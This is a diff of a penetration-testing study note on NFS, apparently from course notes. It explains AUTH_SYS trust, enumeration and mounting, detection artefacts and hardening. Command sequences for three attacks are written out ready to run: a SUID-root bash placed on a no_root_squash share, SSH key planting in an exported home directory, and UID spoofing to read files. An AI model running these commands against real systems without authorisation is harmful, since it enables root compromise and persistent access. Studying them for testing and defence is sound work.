@@ -1,135 +1,137 @@
+# NFS
+
 #NFS #NetworkFileSystem #filetransfer
 
 ## What is NFS?
-Network File System — protocol for accessing files over a network as if they were local. Common on Linux/Unix. Used for shared storage, backups, and home directories.
+
+Network File System — access files over the network as if local, ubiquitous on Linux/Unix for shared storage, backups and home directories. The security model is the catch: classic NFS (v2/v3, and v4 with `sec=sys`) uses **AUTH_SYS**, where the *client* asserts its own UID/GID and the server trusts it. So NFS access control is really "do I control a client that can claim the right UID?" — which is why UID spoofing and `no_root_squash` are the whole game on an engagement.
 
 - Port **TCP/UDP 2049** — NFS
-- Port **TCP/UDP 111** — rpcbind/portmapper (NFS support service)
+- Port **TCP/UDP 111** — rpcbind/portmapper (needed by NFSv2/3; NFSv4 does not use it)
 - Exports configured in `/etc/exports`
-- NFSv4 works through firewalls (single port), older versions need rpcbind
+- NFSv4 is single-port/firewall-friendly and supports Kerberos (`sec=krb5`) — but most real deployments still run `sec=sys` (trust-the-client)
+
+| Version | Notes |
+|---|---|
+| NFSv2 | Legacy; UDP-only |
+| NFSv3 | Variable file sizes, better errors; needs rpcbind |
+| NFSv4 | Stateful, ACLs, firewall-friendly, optional Kerberos — **no MOUNT protocol** (so `showmount` may return nothing) |
 
 ---
 
-## NFS Versions
+## Tools
 
-| Version | Features |
+| Tool | Use |
 |---|---|
-| NFSv2 | Older; operated entirely over UDP |
-| NFSv3 | Variable file sizes, better error reporting; not fully NFSv2 compatible |
-| NFSv4 | Kerberos auth, firewall-friendly, ACLs, stateful, improved security |
+| [[Tools/Scanning/NMAP\|NMAP]] | `nfs-showmount`/`nfs-ls`/`nfs-statfs`/`rpcinfo` NSE — list + *read* exports without mounting |
+| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `auxiliary/scanner/nfs/nfsmount` |
 
----
-
-## Configuration Files
-
-### /etc/exports
-
-```
-# Syntax: <share_path> <host>(<options>)
-/var/nfs/general *(rw,sync,no_subtree_check)
-/home            10.0.0.0/24(rw,sync,no_root_squash)
-/data            192.168.1.5(ro,sync)
-```
-
-| Export Option | Description |
-|---|---|
-| `rw` | Read and write permissions |
-| `ro` | Read only |
-| `sync` | Synchronous data transfer (safer, slower) |
-| `async` | Asynchronous transfer (faster, less safe) |
-| `secure` | Only ports < 1024 accepted |
-| `insecure` | Ports > 1024 accepted |
-| `no_subtree_check` | Disable subdirectory tree checking (common, reduces errors) |
-| `root_squash` | Map root UID/GID 0 to anonymous (default, security measure) |
-| `no_root_squash` | Root on client = root on server — **dangerous** |
-| `all_squash` | Map all UIDs/GIDs to anonymous |
-| `anonuid=<uid>` | UID for anonymous user |
-| `anongid=<gid>` | GID for anonymous user |
+Native clients are the `nfs-common` utilities — `showmount`, `mount -t nfs`, `rpcinfo` — used inline below.
 
 ---
 
 ## Enumeration
 
 ```bash
-# Nmap NFS scripts
+# Nmap NFS scripts — nfs-ls reads file listings/contents without mounting
 nmap -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs -sV <target>
 nmap -p 111 --script rpcinfo <target>
 
-# showmount — list exported shares
+# showmount — list exported shares (MOUNT protocol; NFSv2/3)
 showmount -e <target>
 
-# rpcinfo — list RPC services
+# rpcinfo — list RPC services + ports
 rpcinfo -p <target>
 
 # Metasploit
 use auxiliary/scanner/nfs/nfsmount
 ```
 
+> [!warning] **`showmount -e` returns nothing on NFSv4.** v4 dropped the MOUNT protocol, so a v4-only server can have exports and still show an empty `showmount`. Don't conclude "no exports" — **mount the pseudo-root directly** and browse: `sudo mount -t nfs4 <target>:/ /mnt/t -o nolock` then `ls /mnt/t`.
+
 ---
 
 ## Mount / Access
 
 ```bash
-# Mount NFS share (to local directory)
 sudo mkdir -p /mnt/nfs_target
+
+# NFSv3 export, or the whole root
 sudo mount -t nfs <target>:/ /mnt/nfs_target -o nolock
 sudo mount -t nfs <target>:/home /mnt/nfs_target -o nolock
-sudo mount -t nfs4 <target>:/share /mnt/nfs_target
 
-# List exported shares
-showmount -e <target>
+# NFSv4 pseudo-root (works when showmount is blank)
+sudo mount -t nfs4 <target>:/ /mnt/nfs_target
 
-# Unmount
+df -h ; mount | grep nfs        # confirm
 sudo umount /mnt/nfs_target
-
-# Check what's mounted
-df -h
-mount | grep nfs
 ```
 
 ---
 
 ## Attack Vectors
 
-### Privilege Escalation via no_root_squash
+### Privilege escalation via `no_root_squash`
 
-When a share is exported with `no_root_squash`, root on the client = root on the server.
+When a share is exported `no_root_squash`, **root on the client = root on the server** for that share. Drop a SUID-root shell:
 
 ```bash
-# 1. Mount the share
 sudo mount -t nfs <target>:/home /mnt/nfs_target -o nolock
-
-# 2. Copy bash to the share as root
-sudo cp /bin/bash /mnt/nfs_target/
-sudo chmod +s /mnt/nfs_target/bash  # set SUID bit
-
-# 3. On the target machine (via SSH or shell), execute:
-/home/bash -p  # -p preserves effective UID (runs as root)
+sudo cp /bin/bash /mnt/nfs_target/rootbash
+sudo chmod +s /mnt/nfs_target/rootbash      # SUID
+# then on the target (SSH/existing shell):
+/home/rootbash -p                            # -p preserves euid → root
 ```
 
-### SSH Key Placement via no_root_squash
+### SSH key placement (writable home export)
 
 ```bash
-# 1. Mount the share
 sudo mount -t nfs <target>:/home/user /mnt/nfs_target -o nolock
-
-# 2. Add your SSH public key
 sudo mkdir -p /mnt/nfs_target/.ssh
 sudo bash -c 'cat ~/.ssh/id_rsa.pub >> /mnt/nfs_target/.ssh/authorized_keys'
-
-# 3. SSH in as user
 ssh user@<target>
 ```
 
-### UID Spoofing
+### UID/GID spoofing (AUTH_SYS)
+
+The core trust weakness: with `sec=sys`, the server enforces file permissions against the **client-asserted** UID. If a file is owned by UID 1001, become UID 1001 locally and you own it — no server-side auth involved.
 
 ```bash
-# NFS maps access by UID — if share uses uid-based permissions
-# Create a local user with same UID as target
-sudo useradd -u 1001 targetuser
-sudo su - targetuser
-ls /mnt/nfs_target  # access as UID 1001
+sudo useradd -u 1001 victimuid          # match the target file's owner UID
+sudo -u victimuid cat /mnt/nfs_target/secret     # read as UID 1001
 ```
+
+`root_squash` only remaps UID 0 → `nobody`; every *non-root* UID is still spoofable, so `root_squash` is not much protection against a determined client. Kerberos (`sec=krb5`) is what actually fixes this.
+
+---
+
+## Export Options (`/etc/exports`)
+
+```
+# <share_path> <host>(<options>)
+/var/nfs/general *(rw,sync,no_subtree_check)
+/home            10.0.0.0/24(rw,sync,no_root_squash)
+/data            192.168.1.5(ro,sync)
+```
+
+| Option | Meaning |
+|---|---|
+| `rw` / `ro` | Read-write / read-only |
+| `no_root_squash` | Client root = server root — **dangerous** |
+| `root_squash` | Map UID/GID 0 → anonymous (default; non-root UIDs still trusted) |
+| `all_squash` | Map *all* UIDs → anonymous |
+| `anonuid=` / `anongid=` | UID/GID the squashed anon maps to |
+| `insecure` | Accept client source ports > 1024 (unprivileged clients) |
+| `no_subtree_check` | Disable subtree checking (common) |
+
+---
+
+## Detection & Artefacts
+
+- **Mount attempts and `showmount` queries** land in the server's `rpc.mountd`/`rpcbind` logs; a mount from an unexpected client IP is the first tell.
+- **The `no_root_squash` privesc leaves a SUID-root binary** in the exported path — a `chmod +s` file owned by root in a user share is the artefact; `find <export> -perm -4000` finds it.
+- **UID spoofing is invisible server-side** — the server just sees "UID 1001 read a file it's allowed to." Detection has to be client-attestation (Kerberos) or network ACLs, not logs.
+- Defensive baseline: `root_squash`+`all_squash`, `sec=krb5`, host-restricted exports (never `*`), `ro` where possible, and no sensitive data in world-mountable shares.
 
 ---
 
@@ -137,11 +139,11 @@ ls /mnt/nfs_target  # access as UID 1001
 
 | Setting | Risk |
 |---|---|
-| `no_root_squash` | Root on client = root on server → easy privesc |
-| `*(rw,...)` wildcard | Any host can mount and write |
-| `insecure` | Clients can use unprivileged ports |
-| Sensitive data in exports | Data exposure |
-| NFSv2/3 without auth | No Kerberos → UID spoofing |
+| `no_root_squash` | Root on client = root on server → trivial privesc via SUID |
+| `*(rw,...)` wildcard host | Any host can mount and write |
+| `insecure` | Clients can use unprivileged (>1024) source ports |
+| `sec=sys` (no Kerberos) | UID/GID spoofing — server trusts client-asserted identity |
+| Sensitive data in exports | Direct data exposure to any allowed client |
 
 ---
 
@@ -149,9 +151,20 @@ ls /mnt/nfs_target  # access as UID 1001
 
 | Goal | Command |
 |---|---|
-| List exports | `showmount -e host` |
-| Mount share | `sudo mount -t nfs host:/share /mnt/target -o nolock` |
-| Unmount | `sudo umount /mnt/target` |
-| Check exports config | `cat /etc/exports` |
-| SUID bash privesc | `cp /bin/bash /mnt; chmod +s /mnt/bash; ./bash -p` |
-| Nmap enum | `nmap -p 111,2049 --script nfs-showmount,nfs-ls` |
+| List exports (v2/3) | `showmount -e host` |
+| Read exports w/o mounting | `nmap -p 111,2049 --script nfs-ls,nfs-showmount host` |
+| Mount share | `sudo mount -t nfs host:/share /mnt/t -o nolock` |
+| Mount v4 pseudo-root | `sudo mount -t nfs4 host:/ /mnt/t` |
+| SUID-bash privesc | `cp /bin/bash /mnt/rootbash; chmod +s /mnt/rootbash; ./rootbash -p` |
+| UID spoof | `useradd -u <uid> x; sudo -u x cat /mnt/file` |
+| RPC services | `rpcinfo -p host` |
+
+---
+
+> [!note] **See also** — file-share siblings [[Services/File Xfer/SMB|SMB]] (the Windows equivalent) and [[Services/File Xfer/Rsync|Rsync]]; `no_root_squash`/SUID sits in the wider Linux privesc toolkit ([[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]]).
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-09-23*
+*Model: claude-opus-4-8*
